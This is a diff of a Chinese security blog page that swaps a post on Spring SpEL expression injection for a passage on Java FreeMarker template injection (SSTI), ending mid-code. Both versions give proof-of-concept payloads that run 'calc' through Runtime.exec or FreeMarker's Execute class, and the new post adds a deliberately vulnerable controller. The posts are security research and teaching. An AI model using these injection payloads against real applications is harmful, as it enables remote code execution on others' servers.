@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>spEL表达式注入 | Godown_blog</title>
+  <title>Java Freemarker SSTI | Godown_blog</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -591,14 +591,14 @@
 
 
 <div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8107.jpg')">
+  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8152.jpg')">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        spEL表达式注入
+        Java Freemarker SSTI
       </span>
     </div>
     
@@ -619,75 +619,213 @@
   <div class="main-content">
     <article class="post post-detail">
       <div class="post-content">
-        <p>学C3P0不会jackson，然后滚去学jackson了</p>
-<p>学jackson不会spEL，然后滚去学spEL了</p>
-<p>学SpEL不会spring，然后滚来学spring了</p>
-<h3 id="spring"><a href="#spring" class="headerlink" title="spring"></a>spring</h3><p>spring提供了很多种从xml文件实例化bean的方法。虽然这只是spring的一小部分功能，但这是学java安全的一大部分了（hh</p>
-<p>xml的模板如下，每个xml至少都会包括以下内容，算是个规范</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;beans xmlns=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="line">       xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">       xsi:schemaLocation=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="line"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><span class="line">		...</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>
+        <h1 id="Java-Freemarker-SSTI"><a href="#Java-Freemarker-SSTI" class="headerlink" title="Java Freemarker SSTI"></a>Java Freemarker SSTI</h1><p>最新版本也能注入，具体看有没有通过<code>freemarker.core.Configurable#setNewBuiltinClassResolver</code>方法进行安全设置</p>
+<p>代码测试环境（位于HelloController）：<a target="_blank" rel="noopener" href="https://github.com/godownio/SSTIVuln">https://github.com/godownio/SSTIVuln</a></p>
+<p>pom：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.freemarker<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>freemarker<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.32<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
+<h2 id="Freemarker的使用"><a href="#Freemarker的使用" class="headerlink" title="Freemarker的使用"></a>Freemarker的使用</h2><p>准备一个ftl文件，放在resources&#x2F;templates目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, $&#123;name&#125;!</span><br></pre></td></tr></table></figure>
 
+<p>写Java代码加载并渲染模板</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> freemarker.template.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FreemarkerExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Configuration</span> <span class="variable">cfg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>(Configuration.VERSION_2_3_32);</span><br><span class="line">        cfg.setClassForTemplateLoading(FreemarkerExample.class, <span class="string">&quot;/templates&quot;</span>); <span class="comment">// 模板文件目录</span></span><br><span class="line">        cfg.setDefaultEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Template</span> <span class="variable">template</span> <span class="operator">=</span> cfg.getTemplate(<span class="string">&quot;hello.ftl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Object&gt; data = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        data.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Alice&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">        template.process(data, writer);</span><br><span class="line"></span><br><span class="line">        System.out.println(writer.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>剩下的见5tooc3a blog springRe0：</p>
-<p><a target="_blank" rel="noopener" href="https://www.yuque.com/5tooc3a/jas/vwovvqh6w86ifrye#">https://www.yuque.com/5tooc3a/jas/vwovvqh6w86ifrye#</a></p>
-<p>写的非常好，好的我挑不出哪里需要重写，为防止网站挂掉，转载到blog了</p>
-<h2 id="SeEL简介"><a href="#SeEL简介" class="headerlink" title="SeEL简介"></a>SeEL简介</h2><p>在 spring3 中引入了 spring 表达式语言(Spring Expression Language)</p>
-<p>主要作用是对于基于 XML 文件或者基于注解的 Spring 配置的装载。也就是对IOC容器中的javaBean进行动态属性状态和提取。</p>
-<p>SpEL表达式定界符为<code>#&#123;&#125;</code>，加载外部属性文件还能用<code>$&#123;&#125;</code></p>
-<p>pom.xml：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-expression<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到Alice代替了<code>$&#123;name&#125;</code>被输出</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250428170556049.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250428170556049.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250428170556049"></p>
+<p>上面这个代码是脱离spring环境去使用的Freemarker</p>
+<p>springBoot 集成Freemarker就更简单了：</p>
+<p>application.yml配置，指定用freemarker去找templates目录下的ftl文件解析：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">freemarker:</span></span><br><span class="line">    <span class="attr">template-loader-path:</span> <span class="string">classpath:/templates/</span></span><br><span class="line">    <span class="attr">suffix:</span> <span class="string">.ftl</span></span><br><span class="line">    <span class="attr">charset:</span> <span class="string">UTF-8</span></span><br></pre></td></tr></table></figure>
 
-<p>同样能看：</p>
-<p><a target="_blank" rel="noopener" href="https://www.yuque.com/5tooc3a/jas/tgmsxhgzn4a615sx#">https://www.yuque.com/5tooc3a/jas/tgmsxhgzn4a615sx#</a></p>
-<p>spEL解析所需的依赖为spring-expression包</p>
-<h3 id="xml文档注入"><a href="#xml文档注入" class="headerlink" title="xml文档注入"></a>xml文档注入</h3><p>spring最基础的解析xml，可以用<code>#&#123;&#125;</code>表达式搭配<code>T()</code>使用其他类的静态方法</p>
-<p><code>T()</code>能获取到基础类（并不能实例化），之后就可以调用该类的静态方法</p>
-<p>Person类：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Controller直接返回<code>.ftl</code>，注意如果你的环境即有Thymeleaf又有freemarker，springBoot默认优先用Thymeleaf去解析模板，得把Thymeleaf依赖注释掉</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/freemarker&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(<span class="meta">@RequestParam</span> String payload, Model model)</span> &#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;name&quot;</span>, payload);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>; <span class="comment">// 自动找 hello.ftl</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>比如<code>Runtime.getRuntime().exec</code>：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;beans xmlns=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="line">       xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">       xsi:schemaLocation=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><span class="line">    &lt;bean id=<span class="string">&quot;Person&quot;</span> class=<span class="string">&quot;org.exploit.othercase.SpEL.Person&quot;</span>&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;name&quot;</span> value=<span class="string">&quot;#&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&#125;&quot;</span> /&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;age&quot;</span> value=<span class="string">&quot;#&#123;1&#125;&quot;</span> /&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="FTL语法"><a href="#FTL语法" class="headerlink" title="FTL语法"></a>FTL语法</h2><p>简单的提一下几个漏洞触发会用到的语法，其他的感兴趣可以官网见</p>
+<table>
+<thead>
+<tr>
+<th align="left">功能</th>
+<th align="left">示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">变量</td>
+<td align="left"><code>$&#123;name&#125;</code></td>
+</tr>
+<tr>
+<td align="left">条件判断</td>
+<td align="left"><code>&lt;#if age gt 18&gt;Adult&lt;#else&gt;Minor&lt;/#if&gt;</code></td>
+</tr>
+<tr>
+<td align="left">循环</td>
+<td align="left"><code>&lt;#list users as user&gt;$&#123;user.name&#125;&lt;/#list&gt;</code></td>
+</tr>
+<tr>
+<td align="left">调用方法</td>
+<td align="left"><code>$&#123;user.getName()&#125;</code></td>
+</tr>
+<tr>
+<td align="left">引入其他模板</td>
+<td align="left"><code>&lt;#include &quot;footer.ftl&quot;&gt;</code></td>
+</tr>
+</tbody></table>
+<p><code>#</code>和<code>@</code>搭配使用，<code>#</code>定义，<code>@</code>调用，效果等同函数，定义一个可复用的片段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;#macro sayHello name&gt;</span><br><span class="line">  Hello, $&#123;name&#125;!</span><br><span class="line">&lt;/#macro&gt;</span><br><span class="line"></span><br><span class="line">&lt;@sayHello name=&quot;Tom&quot;/&gt;</span><br></pre></td></tr></table></figure>
 
-<p>beans.xml放到resources下，利用ClassPathXmlApplicationContext加载xml文档</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpELcase</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ApplicationContext applicationContext=<span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line">        Person person=applicationContext.getBean(<span class="string">&quot;person&quot;</span>,Person.class);</span><br><span class="line">        person.getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>assign</code> 就是 在模板中<strong>声明变量、做赋值、准备数据</strong>的指令，必须是 <code>&lt;#assign&gt;</code>，不能是 <code>&lt;#Assign&gt;</code>，大小写敏感。</p>
+<p>比如以下三种定义的变量的使用，分别是定义变量、定义Map、定义list和在assign中进行简单运算并赋值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign name = &quot;Tom&quot;&gt;</span><br><span class="line">&lt;#assign person = &#123;&quot;name&quot;: &quot;Alice&quot;, &quot;age&quot;: 20&#125;&gt;</span><br><span class="line">&lt;#assign animals = [&quot;cat&quot;, &quot;dog&quot;, &quot;bird&quot;]&gt;</span><br><span class="line">&lt;#assign sum = 2 + 3&gt;</span><br></pre></td></tr></table></figure>
 
-<p>singleton模式下，Spring加载bean并调用setter进行依赖注入的行为发生在ClassPathXmlApplicationContext加载XML配置文件的过程中，具体来说：</p>
+<p>还有很多内置函数，这里说两个漏洞利用中会用到的</p>
+<h3 id="内建函数-new"><a href="#内建函数-new" class="headerlink" title="内建函数 new"></a>内建函数 new</h3><p><code>new</code> 是一个内建函数，用来在模板中创建 “对象实例”。就是你可以在模板里，像在 Java 里 <code>new 一个对象</code> 一样。但注意：FreeMarker 里 <code>new</code> 出来的不是任意 Java 类，只能是 <strong>FreeMarker 支持的特定类型</strong>。</p>
+<p>语法为：<code>&lt;要处理的对象&gt;?new</code></p>
+<p>比如new一个WordWrapperDirective赋值给word_wrapp：<code>&lt;#assign word_wrapp = &quot;com.acmee.freemarker.WordWrapperDirective&quot;?new()&gt;</code></p>
+<p>注意new_list、new_map和new不一样，new_list和new_map是单独的内置函数，虽然使用上是一样的</p>
+<p>比如new一个空list赋值给animals：<code>&lt;#assign animals = []?new_list&gt;</code></p>
+<p>或者new一个Map赋给person：<code>&lt;#assign person = &#123;&#125;?new_map&gt;</code></p>
+<p>该内建函数可以创建任意的 Java 对象，只要类实现了 <strong>TemplateModel</strong> 接口即可创建，进而使用这些对象， 并且可以触发没有实现 TemplateModel 接口的类的静态初始化块。美妙的链子警告</p>
+<h3 id="api"><a href="#api" class="headerlink" title="api"></a>api</h3><p>api 内建函数于 FreeMarker 2.3.22 版本出现，之前版本不存在</p>
 <ul>
-<li>加载配置文件阶段：<br>当使用ClassPathXmlApplicationContext类来加载一个或多个XML配置文件时，Spring会解析这些配置文件中的bean定义，并将它们注册到IoC容器中。</li>
-<li>bean实例化与依赖注入：<br>在这个过程中，对于每个bean，Spring会根据XML中定义的信息创建bean的实例。<br>如果bean定义中包含了属性及其setter方法，则Spring会调用这些setter方法来完成依赖注入。</li>
-<li>getBean方法：<br>当通过getBean方法从应用上下文中请求某个bean时，Spring实际上是从已经初始化好的bean池中获取该bean的引用。<br>此时，bean的实例化和依赖注入工作已经完成。</li>
+<li><code>?api</code> 是什么？</li>
 </ul>
-<p>调用getBean只是从容器中获取已经准备好的bean实例。</p>
-<p>singleton和prototype模式的区别：</p>
-<p>对于singleton作用域的bean，Spring会在启动时创建一个单例实例，并将其保存在容器中。<br>对于prototype作用域的bean，Spring不会在启动时创建实例，而是在每次调用getBean方法时创建一个新的实例。</p>
-<h3 id="SpelExpressionParser-注入"><a href="#SpelExpressionParser-注入" class="headerlink" title="SpelExpressionParser 注入"></a>SpelExpressionParser 注入</h3><p>SpelExpressionParser.parseExpression进行Spel解析，直接注，无需<code>#&#123;&#125;</code></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExpressionTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line">        <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(<span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>);</span><br><span class="line">        <span class="type">EvaluationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardEvaluationContext</span>();</span><br><span class="line">        expression.getValue(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在 FreeMarker 里，<code>?api</code> 内建函数的作用是：</p>
+<blockquote>
+<p><strong>把一个普通的 Java 对象</strong>，暴露成一个可以<strong>直接调用 Java 方法和字段</strong>的对象。</p>
+</blockquote>
+<p>正常情况下，FreeMarker模板是安全沙箱的 —— 它不允许你直接在模板里调用任意 Java 类或者方法，以避免安全问题。</p>
+<p>而 <code>?api</code> 就是一个突破限制的“开关”。</p>
+<p>举个例子：</p>
+<p>假设有个Person类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>调用getValue触发表达式的执行</p>
-<p>甚至可以直接new对象：</p>
+<p>你在模板里拿到一个 <code>person</code> 对象，正常只能通过 <code>$&#123;person.name&#125;</code> 来取属性。</p>
+<p>但是如果用了 <code>?api</code>，就可以直接调用方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;person?api.getName()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在 2.3.22 之前，FreeMarker对 Java 对象访问控制得很严格（只通过 getter &#x2F; 公开字段），但大家在实际开发中有很多需要更灵活操作 Java 对象的需求，所以从 2.3.22 起，官方引入了 <code>?api</code>，允许开发者自愿打开这个“低层访问”的功能。当然，默认是关着的，需要在配置里允许（通过 <code>ObjectWrapper</code> 设置）。</p>
+<h2 id="Freemarker模板注入漏洞分析"><a href="#Freemarker模板注入漏洞分析" class="headerlink" title="Freemarker模板注入漏洞分析"></a>Freemarker模板注入漏洞分析</h2><p>把hello.ftl修改为如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()&gt;$&#123;value(<span class="string">&quot;calc&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在对该模板进行渲染的时候就会触发漏洞</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">nospringToFTL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Configuration</span> <span class="variable">cfg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line">        cfg.setClassForTemplateLoading(nospringToFTL.class, <span class="string">&quot;/templates&quot;</span>); <span class="comment">// 模板文件目录</span></span><br><span class="line">        cfg.setDefaultEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Template</span> <span class="variable">template</span> <span class="operator">=</span> cfg.getTemplate(<span class="string">&quot;hello.ftl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        